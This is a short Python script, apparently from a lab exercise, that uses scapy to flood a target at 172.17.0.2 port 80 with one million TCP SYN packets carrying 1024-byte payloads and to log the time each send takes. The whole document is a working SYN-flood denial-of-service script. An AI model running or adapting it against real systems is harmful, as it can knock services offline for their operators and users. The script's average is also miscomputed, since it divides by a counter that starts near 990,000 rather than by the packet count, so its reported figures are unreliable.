from scapy.all import IP,TCP, Raw, send, RandShort
import time
target_ip = "172.17.0.2"
target_port = 80

def sendPacket():
    file = createFile()
    ip = IP(dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw = Raw(b"X" * 1024)
    packet = ip / tcp / raw
    mone = 989901
    total_time =0 
    for _ in range(0,100):
        for _ in range(0,10000):
           mone = mone + 1
           start = time.time()
           send(packet,loop=0,verbose=0)
           end = time.time()
           file.write(f"{str(mone)},{str(end-start)}")
           total_time=total_time+(end-start)
           file.write("\n")
    average = total_time / mone
    file.close()
    return average

def createFile():
    return  open("syns_results_p.txt", "a")

def ms_from_rtt(rtt):
    return rtt*1000

if __name__ == '__main__':
    avg = sendPacket()
    print(f'avarage is: {avg}')
    
